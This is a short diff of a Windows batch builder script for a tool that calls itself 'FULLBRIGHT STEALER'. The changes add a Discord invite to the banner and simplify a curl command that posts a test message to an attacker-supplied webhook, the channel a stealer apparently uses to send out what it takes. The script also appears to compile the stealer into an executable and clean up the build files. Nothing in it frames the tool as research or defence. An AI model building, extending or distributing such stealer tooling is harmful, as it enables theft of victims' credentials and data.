@@ -1,7 +1,7 @@
 @echo off
 cls
 color 04
-echo FULLBRIGHT STEALER BY RAYWZW
+echo WELCOME TO FULLBRIGHT STEALER BY RAYWZW-JOIN https://discord.gg/aGpfgnW4aW
 timeout /t 2 /nobreak >nul
 cls
 echo Installing dependencies from requirements.txt...
@@ -11,7 +11,7 @@ set /p WEBHOOK_URL=Webhook URL:
 
 :validateWebhook
 echo Testing webhook...
-curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Webhook works\", \"username\": \"FULLBRIGHT\", \"avatar_url\": \"https://imgcdn.stablediffusionweb.com/2024/3/15/21585f60-3dcd-4b44-b522-79dc57d9640f.jpg\"}" %WEBHOOK_URL%
+curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Webhook works\"}" %WEBHOOK_URL%
 if %errorlevel% neq 0 (
     echo Invalid webhook URL, please try again.
     set /p WEBHOOK_URL=Webhook URL: 
@@ -37,3 +37,4 @@ echo Cleaning up...
 del main.spec
 rd /s /q build
 pause
+ 
